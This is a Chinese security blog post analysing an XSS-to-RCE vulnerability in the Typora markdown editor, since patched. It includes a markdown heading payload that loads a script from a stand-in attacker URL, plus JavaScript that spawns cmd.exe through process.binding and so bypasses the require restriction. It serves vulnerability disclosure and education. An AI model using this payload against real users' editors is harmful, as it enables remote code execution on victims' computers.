# Typora XSS 到 RCE (上)

阅读量 **284207**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-02-18 14:35:49

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言：

在去年的12月份，我在知乎上看到了一篇名为《[如何在Typora编辑器上实现远程命令执行](https://zhuanlan.zhihu.com/p/51768716)》
的文章，作者发现了 Typora 对`iframe`标签处理不当造成的 XSS 漏洞，而正如文章作者所说：针对Electron应用，大部分时候我们只要找到了
XSS 漏洞，也就约等于完成了命令执行。最终用户只需打开攻击者构造好的恶意文档，就会被攻击。

这篇文章使我感到非常后怕，因为我平时里正是使用 Typora 编写 Markdown 文档，而我身边也有不少朋友同样是 Typora
的忠实用户。因此我决定要深入挖掘一下，看看 Typora
是否还有其他漏洞。于是在陆续结束了期末考试和校内招新赛(Hgame)准备之后，我在两天时间里，也挖到了三个Typora
XSS漏洞，同样它们也可以造成RCE。

Typora官方为此在两天之内连续发布了两个安全更新，截止目前（2019.2.4），还有最后一个漏洞未完成修复。

这里主要分享一下我挖掘到这三个漏洞的过程和漏洞分析。

## 漏洞一：

###  黑盒测试：从输出点入手

如果是使用过 Typora 的师傅应该都知道，Typora 的实时预览模式中，对用户输入的非法(被认为可能造成 XSS 攻击的)`HTML`
标签的处理并不是像其他编辑器那样严格地直接过滤掉，而是会在 HTML编码 后进行安全输出：

![](https://p0.ssl.qhimg.com/t01041cc46cbbad7287.png)

那么可不可能存在一个输出点，标签未经编码就直接输出了呢？

我们要寻找的是默认情况下，用户打开文档之后无需任何操作就能看到的输出位置，这样的位置上的 XSS 才是有意义的。那么除了实时预览界面就只剩下了左侧的大纲栏：

![](https://p3.ssl.qhimg.com/t01f4d686990e85a8b6.png)

Typora 的大纲栏，其实就是自动生成了一个`TOC`
(Typora功能上真的很贴心）,会将各个标题对应的锚点链接逐级排列在左侧边栏。那么我们通过开发者工具对这里的输出进行测试：

![](https://p5.ssl.qhimg.com/dm/1024_251_/t0133a223549821e083.png)

我们看到，左侧的大纲栏似乎并没有原样直接输出标题中的内容，而是除去了`script`标签。

那么来看看如果输入的是合法的标签呢？

![](https://p2.ssl.qhimg.com/dm/1024_162_/t01fbf2612b3c302df0.png)

这里 `<i>` 标签同样被过滤掉了，这说明这个输出点默认只输出文本内容。

那么我们如果把标签以文本、而非 HTML 标签的形式插入进去呢？

我们都知道在 Markdown 语法中，如果我们想表示`<` `>` 这样的 HTML 保留字符，我们就需要在输入时用反斜杠进行转义，于是尝试如下输入：

    
    
    # \<i\>H1\</i\>
    

结果：

![](https://p1.ssl.qhimg.com/dm/1024_208_/t016f052831c176bac4.png)

可以看到在大纲栏中成功插入了HTML标签。

尝试构造 XSS：

    
    
    # \<script>alert(1)\</script\>
    

![](https://p2.ssl.qhimg.com/dm/1024_257_/t013f80f32760b8fa55.png)

当然，也可以引入外部文件来更方便的实施攻击。值得一提的是，在官方修复上一个XSS的时候，同时也禁用了`require` 函数，限制了通过`require`
引入`child_process` 执行系统命令的方法，不过没关系，我们还有`process` ，那么下面是一个执行系统命令的例子：

    
    
    # \<script src=<https://hacker>_s_url/rce.js\>\</script\>
    
    
    
    //rce.js 's content
    var Process = process.binding('process_wrap').Process;
    var proc = new Process();
    proc.onexit = function (a, b) {};
    var env = process.env;
    var env_ = [];
    for (var key in env) env_.push(key + '=' + env[key]);
    proc.spawn({
     file: 'cmd.exe',
     args: ['/k netplwiz'],
     cwd: null,
     windowsVerbatimArguments: false,
     detached: false,
     envPairs: env_,
     stdio: [{
     type: 'ignore'
     }, {
     type: 'ignore'
     }, {
     type: 'ignore'
     }]
    });
    

用户打开文档的效果如下：

![](https://p4.ssl.qhimg.com/t017373f96f31951b54.png)

###  漏洞分析 ：

漏洞虽然挖到了，但是为了更好的理解，我们还需要分析漏洞的成因，Typora 并不是开源软件，因此我们只能自行还原并阅读代码来定位漏洞：

打开开发者工具的 Source 选项卡，可以看到整个项目的目录结构还是非常清晰的：

![](https://p1.ssl.qhimg.com/t0121055b6743c24fb5.png)

`app/window` 下面的 `frame.js`
就是负责`Markdown`解析、页面渲染等主要功能的代码文件，也是我们重点关注的内容。`lib.asar` 文件夹下面则是 Typora
依赖的各种第三方库。

打开`frame.js`并进行格式化，可以看到整个文件超过52000行，对于一款软件而言代码量已经很小了，并且代码未经过混淆、也没有反调试，仅通过
Devtools 我们就可以比较轻松的完成分析和调试。

首先通过类名快速定位到更新大纲栏内容部分的代码：

![](https://p4.ssl.qhimg.com/dm/1024_135_/t014ec774eaa91a06cd.png)

![](https://p0.ssl.qhimg.com/t010a45e12d05e0de0c.png)

可以看到在经过`i.output` 这个方法之后，原本转义的字符完成了逃逸，并且作为`HTML`输出在了大纲栏和类名为`.md-toc-inner`
的标签之中(因此在渲染`[TOC]`的时候也会有同样的问题)。那么我们来跟入`i.output` 看一下为什么转义后的字符会逃逸：

`i.output` 方法实际上是一个循环通过正则表达式匹配各种类型的标签、属性，然后对他们分别进行进一步处理的函数：

![](https://p2.ssl.qhimg.com/t012bf5fde17e2c6496.png)

我们发现我们的输入满足了`this.rules.escape` 的匹配规则：

![](https://p4.ssl.qhimg.com/t0158dc5c294f85659c.png)

可以看到在这一步，首先通过正则表达式

    
    
    /^\\([\\`*{}\[\]()#+\-.!_>$|<~"'&])/
    

匹配转义后的字符，然后将转义字符对应的值和类型（这里是`escape`）赋给一个新对象，`push` 到数组`b`中，并删除匹配到的字符。

通过如此往复循环，最终当 变量 `e==""` 也就是所有输入都处理结束时，循环停止。最后得到数组`b`的值变为：

![](https://p4.ssl.qhimg.com/t019cd50ffa044872d5.png)

随后数组`b`被 传入函数`S`,处理后返回:

![](https://p4.ssl.qhimg.com/t011224b57b3cbbb3d7.png)

我们再跟入函数`S` :

![](https://p0.ssl.qhimg.com/dm/1024_416_/t011aa2daed3c339a61.png)

可以看到整个逻辑是将传入的数组`b` 里面的各个对象通过函数`t`逐个处理成字符后再拼接成字符串返回，跟入函数`t`:

![](https://p4.ssl.qhimg.com/t016ffd182aaf5f93f2.png)

可以看到该函数对不同类型的对象会进行不同的处理，值得注意的是类型为`tag`
的对象的处理是直接返回空字符，这就解释了之前我们测试结果中的所有的标签都会被过滤的原因。

而当判断了输入的对象的中的`type` 为 `escape` 时则会直接返回对象的`text` 属性，导致了转义字符的逃逸。就这样，最终`i.output`
方法的返回值，也就是`n` 的值为：

![](https://p4.ssl.qhimg.com/dm/1024_34_/t01cab60e0df6f69329.png)

被作为`HTML`输出后，自然就造成了XSS。

###  修复方法：

在上述的函数`t` 中，当判断对象类型为`escape` 时，返回对象`text` 属性的`HTML`编码

## 后记：

该漏洞已经在 v0.9.63 中被修复。下一篇文章我将分享我从源码入手发现的另外两个 XSS 漏洞。

## 参考链接：

<https://zhuanlan.zhihu.com/p/51768716>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Li4n0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170665](/post/id/170665)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [xss](/tag/xss)
  * [Web安全](/tag/Web安全)
  * [RCE](/tag/RCE)
  * [Typora](/tag/Typora)

 **+1** __9赞

 __收藏

![](https://thirdqq.qlogo.cn/qqapp/101431079/FE9E250D960932E934495F2729F672E8/40)
Li4n0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

